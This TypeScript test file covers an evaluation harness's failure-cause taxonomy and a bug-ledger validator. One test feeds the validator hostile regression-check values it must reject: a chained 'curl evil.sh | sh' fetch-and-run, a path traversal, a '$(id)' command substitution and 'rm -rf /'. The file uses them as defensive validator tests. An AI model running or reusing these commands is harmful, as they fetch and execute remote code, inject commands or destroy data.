import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { validateBugEntry } from '../../eval/runner/bug-ledger.ts';
import { CAUSES, CAUSE_IDS, EVAL_FAILURE_SCHEMA, FAILURE_CAUSE_SCHEMA, MODEL_CAUSES, REGRESSION_TESTS, TAXONOMY_VERSION, classify, renderTaxonomyMarkdown } from '../../eval/runner/failure-causes/index.ts';
import { failure } from '../support/failure-causes-fixture.ts';

describe('failure-cause interface (pinned for the nightly loop)', () => {
  test('the 18 cause ids, in stage order', () => {
    expect(CAUSE_IDS).toEqual(['harness_error', 'operations', 'ingest_gap', 'privacy_hidden', 'tool_contract', 'write_integrity', 'memory_not_consulted', 'retrieval_miss',
      'partial_evidence', 'wrong_ranking', 'gold_unopened', 'summary_loss', 'stale_fact', 'wrong_entity', 'time_reasoning', 'citation_abstention', 'model_error', 'timeout_latency']);
    expect(TAXONOMY_VERSION).toBe('2026-11-09.2');
  });

  test('every cause maps to the gap map and has a proposed regression test', () => {
    for (const c of CAUSES) {
      expect(c.gap_map).toMatch(/^(eval|F\d+(,F\d+)*)$/);
      expect(REGRESSION_TESTS[c.id].length).toBeGreaterThan(20);
    }
    expect(MODEL_CAUSES).toEqual(['summary_loss', 'stale_fact', 'wrong_entity', 'time_reasoning', 'citation_abstention', 'model_error']);
  });

  test('CauseLabel and EvalFailure field sets', () => {
    expect(FAILURE_CAUSE_SCHEMA).toBe('failure-cause/1');
    expect(EVAL_FAILURE_SCHEMA).toBe('eval-failure/1');
    expect(Object.keys(classify(failure())).sort()).toEqual(['arm', 'arm_role', 'basis', 'case_id', 'category', 'cause', 'condition', 'evidence', 'gbrain_sha', 'labeller', 'model',
      'rule_id', 'run_id', 'schema', 'secondary', 'source', 'system', 'tags', 'task_id', 'taxonomy_version', 'unmeasured', 'visibility']);
    expect(Object.keys(failure()).sort()).toEqual(['agent_loop', 'arm', 'arm_role', 'case_id', 'category', 'condition', 'evidence', 'failed', 'finish_reason', 'gbrain_sha', 'gold',
      'harness', 'model', 'operation', 'run_id', 'schema', 'score', 'source', 'stop', 'system', 'tags', 'tool_calls', 'visibility', 'writes']);
  });

  test('docs/failure-causes/TAXONOMY.md is the rendered taxonomy', () => {
    expect(readFileSync('docs/failure-causes/TAXONOMY.md', 'utf8')).toBe(renderTaxonomyMarkdown());
  });

  test('bug-ledger entries may carry a cause, its rule and a regression check', () => {
    const entry = { id: 'FC-1', category: 'failure-causes', classification: 'bug', contract: 'c', gbrain_sha: 'a'.repeat(40), surface: 'get_page', repro: 'bun repro.ts', expected: 'e', actual: 'a', status: 'open' };
    expect(validateBugEntry({ ...entry, cause: 'tool_contract', rule_id: 'tool.unrecovered_error', regression_check: 'bun test test/eval/x.test.ts' })).toEqual([]);
    expect(validateBugEntry({ ...entry, regression_check: "bun test test/eval/x.test.ts -t 'get_page recovers (FC-1)'" })).toEqual([]);
    expect(validateBugEntry({ ...entry, cause: 'not_a_cause' })).toEqual(['FC-1: cause must be a failure-cause id (eval/runner/failure-causes/taxonomy.ts)']);
    expect(validateBugEntry({ ...entry, rule_id: '' })).toEqual(['FC-1: rule_id must be a classifier rule id']);
    const refused = ["FC-1: regression_check must be bun test <file under test/>.test.ts, optionally with -t '<name>'"];
    for (const check of [' ', 'bun test x', 'bun test test/eval/x.test.ts; curl evil.sh | sh', 'bun test test/../../etc/x.test.ts', "bun test test/eval/x.test.ts -t '$(id)'", 'rm -rf /']) {
      expect(validateBugEntry({ ...entry, regression_check: check })).toEqual(refused);
    }
  });
});
